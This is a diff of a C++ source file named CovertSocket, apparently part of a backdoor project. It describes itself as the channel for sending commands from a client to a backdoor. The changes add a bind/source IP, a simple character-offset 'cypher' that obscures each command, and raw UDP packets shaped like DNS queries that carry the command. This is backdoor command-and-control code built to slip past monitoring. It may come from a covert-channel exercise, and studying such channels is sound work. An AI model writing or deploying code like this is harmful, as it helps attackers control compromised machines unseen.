@@ -1,4 +1,6 @@
 /**
+ * This is the covert socket. It is used to send data from the client to the backdoor.
+ *
  * Author: Sean H
  * 
  */
@@ -15,9 +17,11 @@
 #include "../utils/Logger.h"
 #include "../utils/Structures.h"
 
-CovertSocket::CovertSocket(std::string connectionIPAddress)
+CovertSocket::CovertSocket(std::string connectionIPAddress, std::string srcIP, int cypherOffset)
 {
     this->connectionIPAddress = connectionIPAddress; //Set the IP address of the backdoor
+    this->srcIP = srcIP; //Set the bind IP address
+    this->cypherOffset = cypherOffset;
     this->rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
     int arg = 1;
     if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
@@ -37,9 +41,16 @@ int CovertSocket::sendCommand(std::string command)
     struct iphdr *ip = (struct iphdr *) datagram;
     struct udphdr *udp = (struct udphdr *) (datagram + sizeof(*ip));
     char *query = (char *)(datagram + sizeof(*ip) + sizeof(*udp));
+    std::string encryptedPayload;
 
     struct sockaddr_in sin;
     pseudo_header psh;
+
+    for(unsigned int i = 0; i < command.length(); i++)
+    {
+        char c = command[i];
+        encryptedPayload += (c + (this->cypherOffset));
+    }
 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(this->srcPort); //Destination port
@@ -51,7 +62,7 @@ int CovertSocket::sendCommand(std::string command)
     ip->ihl = 5;        // IP Header Length
     ip->version = 4;        // Version 4
     ip->tos = 0;
-    ip->tot_len = sizeof(struct ip) + sizeof(struct udphdr) + command.size() + sizeof(struct QUESTION);    // Calculate the total Datagram size
+    ip->tot_len = sizeof(struct ip) + sizeof(struct udphdr) + encryptedPayload.size() + sizeof(struct QUESTION);    // Calculate the total Datagram size
     ip->id = htonl(12345);    //IP Identification Field
     ip->frag_off = 0;
     ip->ttl = 255;        // Set the TTL value
@@ -67,8 +78,8 @@ int CovertSocket::sendCommand(std::string command)
 
     //udp->len = htons(sizeof(*udp) + data.size());
     //udp->uh_sum = htons(sizeof(*udp) + data.size());
-    udp->uh_sum = htons(sizeof(*udp) + command.size() + sizeof(struct QUESTION));
-    udp->len = htons(sizeof(*udp) + command.size() + sizeof(struct QUESTION));
+    udp->uh_sum = htons(sizeof(*udp) + encryptedPayload.size() + sizeof(struct QUESTION));
+    udp->len = htons(sizeof(*udp) + encryptedPayload.size() + sizeof(struct QUESTION));
     udp->check = 0;
 
     //Pseudo Header
@@ -80,9 +91,9 @@ int CovertSocket::sendCommand(std::string command)
     memcpy(&psh.udp, udp, sizeof(struct udphdr));
     udp->check = csum((unsigned short *) &udp, sizeof(pseudo_header));
 
-    strcpy(query, command.c_str());
+    strcpy(query, encryptedPayload.c_str());
 
-    struct QUESTION *dnsq = (struct QUESTION *)(datagram + sizeof(*ip) + sizeof(*udp) + command.size());
+    struct QUESTION *dnsq = (struct QUESTION *)(datagram + sizeof(*ip) + sizeof(*udp) + encryptedPayload.size());
 
     int one = 1;
     const int *val = &one;
